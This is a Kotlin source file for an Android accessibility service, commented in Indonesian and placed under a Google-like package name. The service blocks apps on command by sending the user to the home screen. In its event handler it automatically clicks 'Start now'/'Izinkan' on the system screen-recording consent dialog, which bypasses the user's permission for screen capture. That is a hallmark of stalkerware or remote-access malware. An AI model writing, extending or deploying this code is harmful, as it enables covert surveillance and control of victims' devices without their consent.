package com.google.appmods

import android.accessibilityservice.AccessibilityService
import android.accessibilityservice.AccessibilityServiceInfo
import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.content.IntentFilter
import android.os.Build
import android.os.Handler
import android.os.Looper
import android.view.accessibility.AccessibilityEvent
import android.view.accessibility.AccessibilityNodeInfo
import android.widget.Toast
import android.content.pm.PackageManager

class AppBlockerService : AccessibilityService() {

    companion object {
        var instance: AppBlockerService? = null
        val blockedPackages = mutableSetOf<String>()

        fun isEnabled(ctx: Context): Boolean {
            val enabledServices = android.provider.Settings.Secure.getString(
                ctx.contentResolver,
                android.provider.Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES
            ) ?: return false
            
            val component = "${ctx.packageName}/.AppBlockerService"
            val componentFull = "${ctx.packageName}/${ctx.packageName}.AppBlockerService"
            
            return enabledServices.split(":").any { svc ->
                svc.equals(component, ignoreCase = true) || 
                svc.equals(componentFull, ignoreCase = true)
            }
        }
    }

    private val mainHandler = Handler(Looper.getMainLooper())
    private var lastBlockedPkg = ""
    private var lastBlockTime = 0L

    private val commandReceiver = object : BroadcastReceiver() {
        override fun onReceive(ctx: Context, intent: Intent) {
            when (intent.action) {
                "com.sync.xxx.BLOCK_APP" -> {
                    val pkg = intent.getStringExtra("package") ?: return
                    blockedPackages.add(pkg)
                }
                "com.sync.xxx.UNBLOCK_APP" -> {
                    val pkg = intent.getStringExtra("package") ?: return
                    blockedPackages.remove(pkg)
                }
                "com.sync.xxx.UNBLOCK_ALL" -> blockedPackages.clear()
            }
        }
    }

    override fun onServiceConnected() {
        super.onServiceConnected()
        instance = this
        serviceInfo = serviceInfo.apply {
            eventTypes = AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED
            feedbackType = AccessibilityServiceInfo.FEEDBACK_GENERIC
            flags = AccessibilityServiceInfo.FLAG_REPORT_VIEW_IDS
            notificationTimeout = 0
        }
        
        val filter = IntentFilter().apply {
            addAction("com.sync.xxx.BLOCK_APP")
            addAction("com.sync.xxx.UNBLOCK_APP")
            addAction("com.sync.xxx.UNBLOCK_ALL")
        }
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            registerReceiver(commandReceiver, filter, RECEIVER_NOT_EXPORTED)
        } else {
            registerReceiver(commandReceiver, filter)
        }
    }

    override fun onAccessibilityEvent(event: AccessibilityEvent?) {
        if (event?.eventType != AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED) return
        val pkg = event.packageName?.toString() ?: return

        // --- AUTO KLIK IZIN SCREEN RECORD ---
        if (pkg == "com.android.systemui" || pkg == "android") {
            val root = rootInActiveWindow
            if (root != null) {
                val buttons = root.findAccessibilityNodeInfosByText("Start now")
                    ?: root.findAccessibilityNodeInfosByText("Mulai sekarang")
                    ?: root.findAccessibilityNodeInfosByText("Izinkan")
                
                if (buttons != null) {
                    for (btn in buttons) {
                        if (btn.isClickable) {
                            btn.performAction(AccessibilityNodeInfo.ACTION_CLICK)
                            break
                        }
                    }
                }
            }
            return
        }

        // --- BLOKIR APP ---
        if (pkg == packageName) return
        if (!blockedPackages.contains(pkg)) return

        val now = System.currentTimeMillis()
        if (pkg == lastBlockedPkg && now - lastBlockTime < 1000) return
        lastBlockedPkg = pkg
        lastBlockTime = now

        performGlobalAction(GLOBAL_ACTION_HOME)
        mainHandler.postDelayed({ performGlobalAction(GLOBAL_ACTION_HOME) }, 50)

        mainHandler.postDelayed({
            Toast.makeText(this, "Maaf anda tidak bisa membuka aplikasi ini!", Toast.LENGTH_SHORT).show()
        }, 50)
    }

    override fun onInterrupt() {}
    override fun onDestroy() {
        super.onDestroy()
        try { unregisterReceiver(commandReceiver) } catch (_: Exception) {}
        instance = null
    }
}
